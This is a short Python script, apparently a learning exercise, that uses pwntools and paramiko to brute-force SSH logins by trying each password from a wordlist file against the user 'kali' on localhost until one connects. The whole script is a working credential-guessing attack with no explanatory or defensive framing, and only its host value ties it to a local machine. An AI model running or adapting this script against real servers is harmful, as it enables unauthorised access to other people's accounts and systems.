```python
from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempts = 0

with open("pw.txt","r") as password_list:
	for pw in password_list:
		pw = pw.strip("\n")
		try:
			print("[{}] Attempting pass: '{}'!".format(attempts,pw))
			response = ssh(host=host, user=username, password=pw, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(pw))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1

```